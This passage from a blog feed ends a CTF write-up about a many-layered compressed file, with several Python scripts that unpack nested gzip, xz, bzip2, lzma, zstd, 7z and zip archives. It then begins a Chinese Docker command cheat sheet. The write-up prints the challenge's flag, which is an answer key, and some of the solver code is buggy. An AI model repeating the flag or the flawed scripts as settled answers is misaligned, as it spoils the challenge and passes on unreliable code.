f:</span><br><span class="line">        print(&quot;lzma:&quot; + outputfile)</span><br><span class="line">        f.write(lzma.open(input_file).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decompress_zstandard_to_folder(input_file):</span><br><span class="line">    input_file = pathlib.Path(input_file)</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as compressed:</span><br><span class="line">        decomp = zstandard.ZstdDecompressor()</span><br><span class="line">        print(&quot;zst:&quot; + outputfile)</span><br><span class="line">        with open(outputfile, &#x27;wb&#x27;) as destination:</span><br><span class="line">            decomp.copy_stream(compressed, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decompress_gzip_to_folder(input_file):</span><br><span class="line">    with gzip.open(input_file, &#x27;rb&#x27;) as f_in:</span><br><span class="line">        with open(outputfile, &#x27;wb&#x27;) as f:</span><br><span class="line">            print(&quot;lzma:&quot; + outputfile)</span><br><span class="line">            f.write(f_in.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decompress_bzip_to_folder(input_file):</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f_in:</span><br><span class="line">        with open(outputfile, &#x27;wb&#x27;) as f:</span><br><span class="line">            print(&quot;bzip:&quot; + outputfile)</span><br><span class="line">            f.write(bz2.decompress(f_in.read()))</span><br><span class="line"></span><br><span class="line">def decompress_7zip_to_folder(input_file):</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f_in:</span><br><span class="line">        with open(outputfile, &#x27;wb&#x27;) as f:</span><br><span class="line">            print(&quot;7zip:&quot; + outputfile)</span><br><span class="line">            with py7zr.SevenZipFile(input_file, mode=&#x27;r&#x27;) as z:</span><br><span class="line">                z.extractall(outputfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    with open(extra_outputfile, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        print(data[0:4])</span><br><span class="line">        if data[0:4] == b&quot;(\xb5/\xfd&quot;:</span><br><span class="line">            decompress_zstandard_to_folder(extra_outputfile)</span><br><span class="line">        elif data[0:4] == b&#x27;\x1f\x8b\x08\x08&#x27;:</span><br><span class="line">            decompress_gzip_to_folder(extra_outputfile)</span><br><span class="line">        elif data[0:4] == b&#x27;\xfd7zX&#x27; or data[0:4] == b&#x27;]\x00\x00\x80&#x27;:</span><br><span class="line">            decompress_lzma_to_folder(extra_outputfile)</span><br><span class="line">        elif data[0:4] == b&#x27;BZh9&#x27;:</span><br><span class="line">            decompress_bzip_to_folder(extra_outputfile)</span><br><span class="line">        elif data[0:4] == b&#x27;\x37\x7a\xbc\xaf&#x27;:</span><br><span class="line">            decompress_7zip_to_folder(extra_outputfile)</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        extra_outputfile = outputfile</span><br><span class="line">        print(&quot;extra:&quot; + extra_outputfile)</span><br><span class="line">        count = count + 1</span><br><span class="line">        outputfile = &quot;compress/flag&quot; + str(count + 1)</span><br><span class="line">        print(&quot;now:&quot; + outputfile)</span><br><span class="line"></span><br><span class="line"># ACTF&#123;r0cK_4Nd_rolL_1n_C0mpr33s1ng_aNd_uNCOmrEs5iNg&#125;</span><br></pre></td></tr></table></figure><h5 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">input_file = &#x27;flag&#x27;</span><br><span class="line"></span><br><span class="line">def get_compressed_type(filepath: str) -&gt; str:</span><br><span class="line">    # use file command</span><br><span class="line">    cmd = [&#x27;file&#x27;, filepath]</span><br><span class="line">    file_cmd_output = subprocess.run(cmd, stdout=subprocess.PIPE).stdout.decode().strip()</span><br><span class="line">    if &#x27;gzip compressed data&#x27; in file_cmd_output:</span><br><span class="line">        return &#x27;gzip&#x27;</span><br><span class="line"></span><br><span class="line">    if &#x27;XZ compressed data&#x27; in file_cmd_output:</span><br><span class="line">        return &#x27;xz&#x27;</span><br><span class="line"></span><br><span class="line">    if &#x27;bzip2 compressed data&#x27; in file_cmd_output:</span><br><span class="line">        return &#x27;bzip2&#x27;</span><br><span class="line"></span><br><span class="line">    if &#x27;LZMA compressed data&#x27; in file_cmd_output:</span><br><span class="line">        return &#x27;lzma&#x27;</span><br><span class="line"></span><br><span class="line">    if &#x27;Zstandard compressed data&#x27; in file_cmd_output:</span><br><span class="line">        return &#x27;zstd&#x27;</span><br><span class="line"></span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    ctype = get_compressed_type(input_file)</span><br><span class="line">    if ctype == &quot;gzip&quot;:</span><br><span class="line">        tmp_file = input_file + &quot;.gz&quot;</span><br><span class="line">        cmd = &quot;mv &#123;&#125; &#123;&#125;; gunzip &#123;&#125;&quot;.format(input_file, tmp_file, tmp_file)</span><br><span class="line">    elif ctype == &quot;xz&quot;:</span><br><span class="line">        tmp_file = input_file + &quot;.xz&quot;</span><br><span class="line">        cmd = &quot;mv &#123;&#125; &#123;&#125;; unxz &#123;&#125;&quot;.format(input_file, tmp_file, tmp_file)</span><br><span class="line">    elif ctype == &quot;bzip2&quot;:</span><br><span class="line">        tmp_file = input_file + &quot;.bz2&quot;</span><br><span class="line">        cmd = &quot;mv &#123;&#125; &#123;&#125;; bunzip2 &#123;&#125;&quot;.format(input_file, tmp_file, tmp_file)</span><br><span class="line">    elif ctype == &quot;lzma&quot;:</span><br><span class="line">        tmp_file = input_file + &quot;.lzma&quot;</span><br><span class="line">        cmd = &quot;mv &#123;&#125; &#123;&#125;; unlzma &#123;&#125;&quot;.format(input_file, tmp_file, tmp_file)</span><br><span class="line">    elif ctype == &quot;zstd&quot;:</span><br><span class="line">        tmp_file = input_file + &quot;.zst&quot;</span><br><span class="line">        cmd = &quot;mv &#123;&#125; &#123;&#125;; unzstd --force &#123;&#125;&quot;.format(input_file, tmp_file, tmp_file)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;done&quot;)</span><br><span class="line">        break</span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure><h5 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">input_file = &#x27;flag&#x27;</span><br><span class="line">random_list = [</span><br><span class="line">&#x27;gzip&#x27;,</span><br><span class="line">&#x27;xz&#x27;,</span><br><span class="line">&#x27;bzip2&#x27;,</span><br><span class="line">&#x27;lzma&#x27;,</span><br><span class="line">&#x27;zstd&#x27;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">random_choices = []</span><br><span class="line">for i in range(16):</span><br><span class="line">random_choices.append(random.randint(0, len(random_list) - 1))</span><br><span class="line"></span><br><span class="line">for choice in random_choices:</span><br><span class="line">if choice == 0:</span><br><span class="line"># gzip2</span><br><span class="line">out_file = &#x27;flag.gz&#x27;</span><br><span class="line">cmd = &#x27;gzip flag&#x27;</span><br><span class="line"></span><br><span class="line">if choice == 1:</span><br><span class="line"># xz</span><br><span class="line">out_file = &#x27;flag.xz&#x27;</span><br><span class="line">cmd = &#x27;xz flag&#x27;</span><br><span class="line"></span><br><span class="line">if choice == 2:</span><br><span class="line">out_file = &#x27;flag.bz2&#x27;</span><br><span class="line">cmd = &#x27;bzip2 flag&#x27;</span><br><span class="line"></span><br><span class="line">if choice == 3:</span><br><span class="line"># lzma</span><br><span class="line">out_file = &#x27;flag.lzma&#x27;</span><br><span class="line">cmd = &#x27;lzma flag&#x27;</span><br><span class="line"></span><br><span class="line">if choice == 4:</span><br><span class="line"># lzma</span><br><span class="line">out_file = &#x27;flag.zst&#x27;</span><br><span class="line">cmd = &#x27;zstd -f flag&#x27;</span><br><span class="line"></span><br><span class="line">os.system(cmd)</span><br><span class="line">os.system(&#x27;mv &#123;&#125; &#123;&#125;&#x27;.format(out_file, input_file))</span><br><span class="line"></span><br><span class="line">print(&quot;done&quot;)</span><br><span class="line">print(&quot;choices:&quot;, random_choices)</span><br><span class="line"># choices: [2, 3, 3, 3, 1, 2, 1, 1, 1, 2, 0, 1, 2, 3, 3, 4]</span><br></pre></td></tr></table></figure><h5 id="exp4"><a href="#exp4" class="headerlink" title="exp4"></a>exp4</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">index = 750</span><br><span class="line">while True:</span><br><span class="line">    newfile = os.listdir(f&quot;D:\\aaa\\202209\\1\\&#123;index-1&#125;&quot;)[-1]</span><br><span class="line">    os.system(f&quot;\&quot;D:\\Program Files\\7-Zip\\7z.exe\&quot; x D:\\aaa\\202209\\1\\&#123;index-1&#125;\\&#123;newfile&#125; -oD:\\aaa\\202209\\1\\&#123;index&#125; -aoa&quot;)</span><br><span class="line">    index +=1</span><br></pre></td></tr></table></figure><h5 id="exp5"><a href="#exp5" class="headerlink" title="exp5"></a>exp5</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import filetype</span><br><span class="line">import bz2</span><br><span class="line">import os</span><br><span class="line">import gzip</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import zipfile</span><br><span class="line">import lzma</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    kind = filetype.guess(&quot;new&quot;)</span><br><span class="line">    print(kind.extension)</span><br><span class="line"></span><br><span class="line">    if kind.extension == &quot;bz2&quot;:</span><br><span class="line">        bz2file = bz2.BZ2File(&quot;new&quot;)  # open the file</span><br><span class="line">        data = bz2file.read()  # get the decompressed data</span><br><span class="line">        open(&quot;new&quot;, &#x27;wb&#x27;).write(data)  # write a uncompressed file</span><br><span class="line">    elif kind.extension == &quot;gz&quot;:</span><br><span class="line">        input = gzip.GzipFile(&quot;new&quot;, &#x27;rb&#x27;)</span><br><span class="line">        s = input.read()</span><br><span class="line">        input.close()</span><br><span class="line">        output = open(&quot;new&quot;, &#x27;wb&#x27;)</span><br><span class="line">        output.write(s)</span><br><span class="line">        output.close()</span><br><span class="line">    elif kind.extension == &quot;zip&quot;:</span><br><span class="line">        file = zipfile.ZipFile(&quot;new&quot;, &#x27;r&#x27;)</span><br><span class="line">        file.extractall(&quot;.&quot;)</span><br><span class="line">        f = open(&quot;flag&quot;, &quot;rb&quot;).read()</span><br><span class="line">        new = open(&quot;new&quot;, &quot;wb&quot;).write(f)</span><br><span class="line">    elif kind.extension == &quot;xz&quot;:</span><br><span class="line">        f = lzma.open(&quot;new&quot;, &#x27;rb&#x27;).read()</span><br><span class="line">        open(&quot;new&quot;, &quot;wb&quot;).write(f)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker速成</title>
      <link href="/article/2022-07-14-docker%E9%80%9F%E6%88%90/"/>
      <url>/article/2022-07-14-docker%E9%80%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<p>主要记录一下docker常用的命令和备忘录。</p><span id="more"></span><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install docker-compose//安装docker-compose</span><br><span class="line">apt install docker.io//安装docker</span><br></pre></td></tr></table></figure><p>如果没有建议参考一下教程，跟Linux版本有关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#docker安装</span><br><span class="line">https://www.runoob.com/docker/ubuntu-docker-install.html</span><br><span class="line">#docker-compose安装</span><br><span class="line">https://www.runoob.com/docker/docker-compose.html</span><br></pre></td></tr></table></figure><h2 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h2><p>dockers加速在文件中写入/etc/docker/daemon.json </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;registry-mirrors&quot;:[</span><br><span class="line">&quot;https://mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;https://registry.docker-cn.com&quot;]&#125;</span><br></pre></td></tr></table></figure><h2 id="docker常用方法"><a href="#docker常用方法" class="headerlink" title="docker常用方法"></a>docker常用方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.runoob.com/docker/docker-command-manual.html</span><br></pre></td></tr></table></figure><h3 id="容器生命周期管理"><a href="#容器生命周期管理" class="headerlink" title="容器生命周期管理"></a>容器生命周期管理</h3><p>docker服务启动/停止/重启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start/stop/restart</span><br></pre></td></tr></table></figure><p><strong>docker run ：</strong>创建一个新的容器并运行一个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 1001:80 test:v1</span><br><span class="line">docker run -itd -P test:v1</span><br><span class="line">docker run -it test:v1 /bin/bash#使用镜像test:v1以交互模式启动一个容器,在容器内执行/bin/bash命令。</span><br><span class="line"></span><br><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-d: 后台运行</span><br><span class="line">-p: 指定端口 宿主机端口:容器端口</span><br><span class="line">-P: 随机端口映射，容器内部端口随机映射到主机的端口</span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br></pre></td></tr></table></figure><p><strong>docker start\stop\restart</strong> :启动一个或多个已经被停止的容器\停止一个运行中的容器\重启容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start/stop/restart 容器ID</span><br></pre></td></tr></table></figure><p><strong>docker kill</strong> :杀掉一个运行中的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker kill -s KILL mynginx#杀掉运行中的容器mynginx</span><br><span class="line"> </span><br><span class="line">docker kill [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-s :向容器发送一个信号</span><br></pre></td></tr></table></figure><p><strong>docker rm ：</strong>删除一个或多个容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f db01 db02  #强制删除容器db01、db02，在运行过程中也能删除</span><br><span class="line">docker rm $(docker ps -a -q)#删除所有已经停止的容器</span><br><span class="line"></span><br><span class="line">docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-f :通过 SIGKILL 信号强制删除一个运行中的容器，可以删除运行中的</span><br><span class="line">-l :移除容器间的网络连接，而非容器本身。</span><br><span class="line">-v :删除与容器关联的卷。</span><br></pre></td></tr></table></figure><p><strong>docker exec ：</strong>在运行的容器中执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it mynginx /bin/sh /root/runoob.sh #在容器mynginx中以交互模式执行容器内/root/runoob.sh脚本</span><br><span class="line">docker exec -i -t  mynginx /bin/bash#在容器 mynginx 中开启一个交互模式的终端</span><br><span class="line">docker exec -it 9df70f9a0714 /bin/bash#通过 exec 命令对指定的容器执行bash</span><br><span class="line"></span><br><span class="line">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-d :分离模式: 在后台运行</span><br><span class="line">-i :即使没有附加也保持STDIN 打开</span><br><span class="line">-t :分配一个伪终端</span><br></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><p><strong>docker ps :</strong> 列出容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">docker ps#列出所有在运行的容器信息。</span><br><span class="line">docker ps -a -q#列出所有创建的容器ID。</span><br><span class="line">输出信息解释：</span><br><span class="line">CONTAINER ID: 容器 ID。</span><br><span class="line">IMAGE: 使用的镜像。</span><br><span class="line">COMMAND: 启动容器时运行的命令。</span><br><span class="line">CREATED: 容器的创建时间。</span><br><span class="line">STATUS: 容器状态。</span><br><span class="line">created（已创建）</span><br><span class="line">restarting（重启中）</span><br><span class="line">running（运行中）</span><br><span class="line">removing（迁移中）</span><br><span class="line">paused（暂停）</span><br><span class="line">exited（停止）</span><br><span class="line">dead（死亡）</span><br><span class="line">PORTS: 容器的端口信息和使用的连接类型（tcp\udp）。</span><br><span class="line">NAMES: 自动分配的容器名称。</span><br><span class="line"></span><br><span class="line">docker ps [OPTIONS]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a :显示所有的容器，包括未运行的。</span><br><span class="line">-f :根据条件过滤显示的内容。</span><br><span class="line">--format :指定返回值的模板文件。</span><br><span class="line">-l :显示最近创建的容器。</span><br><span class="line">-n :列出最近创建的n个容器。</span><br><span class="line">--no-trunc :不截断输出。</span><br><span class="line">-q :静默模式，只显示容器编号。</span><br><span class="line">-s :显示总的文件大小。</span><br></pre></td></tr></table></figure><p>**docker top :**查看容器中运行的进程信息，支持 ps 命令参数。</p><p>容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看container中正在运行的进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker top mymysql#查看容器mymysql的进程信息</span><br><span class="line">for i in  `docker ps |grep Up|awk &#x27;&#123;print $1&#125;&#x27;`;do echo \ &amp;&amp;docker top $i; done #查看所有运行容器的进程信息</span><br><span class="line"></span><br><span class="line">docker top [OPTIONS] CONTAINER [ps OPTIONS]</span><br></pre></td></tr></table></figure><p><strong>docker logs :</strong> 获取容器的日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f mynginx#跟踪查看容器mynginx的日志输出</span><br><span class="line">docker logs --since=&quot;2016-07-01&quot; --tail=10 mynginx#查看容器mynginx从2016年7月1日后的最新10条日志。</span><br><span class="line"></span><br><span class="line">docker logs [OPTIONS] CONTAINER</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-f : 跟踪日志输出</span><br><span class="line">--since :显示某个开始时间的所有日志</span><br><span class="line">-t : 显示时间戳</span><br><span class="line">--tail :仅列出最新N条容器日志</span><br></pre></td></tr></table></figure><p>**docker export :**将文件系统作为一个tar归档文件导出到STDOUT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker export -o mysql-`date +%Y%m%d`.tar a404c6c174a2 #将id为a404c6c174a2的容器按日期保存为tar文件。</span><br><span class="line"></span><br><span class="line">docker export [OPTIONS] CONTAINER</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-o :将输入内容写到文件。</span><br></pre></td></tr></table></figure><p>**docker port :**列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker port mymysql#查看容器mynginx的端口映射情况。</span><br><span class="line"></span><br><span class="line">docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]]</span><br></pre></td></tr></table></figure><h3 id="容器rootfs命令"><a href="#容器rootfs命令" class="headerlink" title="容器rootfs命令"></a>容器rootfs命令</h3><p>**docker commit :**从容器创建一个新的镜像。个人理解是通过修改容器里面的东西然后保存到镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; a404c6c174a2  mymysql:v1</span><br><span class="line">#将容器a404c6c174a2保存为新的镜像,并添加提交人信息和说明信息。</span><br><span class="line">docker images mymysql:v1</span><br><span class="line"></span><br><span class="line">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a :提交的镜像作者；</span><br><span class="line">-c :使用Dockerfile指令来创建镜像；</span><br><span class="line">-m :提交时的说明文字；</span><br><span class="line">-p :在commit时，将容器暂停。</span><br></pre></td></tr></table></figure><p>**docker cp :**用于容器与主机之间的数据拷贝。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www/  #将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下</span><br><span class="line">docker cp /www/runoob 96f7f14e99ab:/www   #将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。</span><br><span class="line">docker cp  96f7f14e99ab:/www /tmp/  #将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中。</span><br><span class="line"></span><br><span class="line">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-L :保持源目标中的链接</span><br></pre></td></tr></table></figure><p><strong>docker diff :</strong> 检查容器里文件结构的更改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker diff mymysql#查看容器mymysql的文件结构更改。</span><br><span class="line"></span><br><span class="line">docker diff [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure><h3 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h3><p><strong>docker login :</strong> 登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</p><p><strong>docker logout :</strong> 登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker login -u 用户名 -p 密码#登陆到Docker Hub</span><br><span class="line">docker logout   #登出Docker Hub</span><br><span class="line"></span><br><span class="line">docker login [OPTIONS] [SERVER]</span><br><span class="line">docker logout [OPTIONS] [SERVER]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-u :登陆的用户名</span><br><span class="line">-p :登陆的密码</span><br></pre></td></tr></table></figure><p><strong>docker search :</strong> 从Docker Hub查找镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker search -f stars=10 java #从Docker Hub查找所有镜像名包含java，并且收藏数大于10的镜像</span><br><span class="line">输出信息解释：</span><br><span class="line">NAME: 镜像仓库源的名称</span><br><span class="line">DESCRIPTION: 镜像的描述</span><br><span class="line">OFFICIAL: 是否 docker 官方发布</span><br><span class="line">stars: 类似 Github 里面的 star，表示点赞、喜欢的意思。</span><br><span class="line">AUTOMATED: 自动构建。</span><br><span class="line"></span><br><span class="line">docker search [OPTIONS] TERM</span><br><span class="line">OPTIONS说明：</span><br><span class="line">--automated :只列出 automated build类型的镜像；</span><br><span class="line">--no-trunc :显示完整的镜像描述；</span><br><span class="line">-f &lt;过滤条件&gt;:列出收藏数不小于指定值的镜像。</span><br></pre></td></tr></table></figure><p><strong>docker pull :</strong> 从镜像仓库中拉取或者更新指定镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker pull 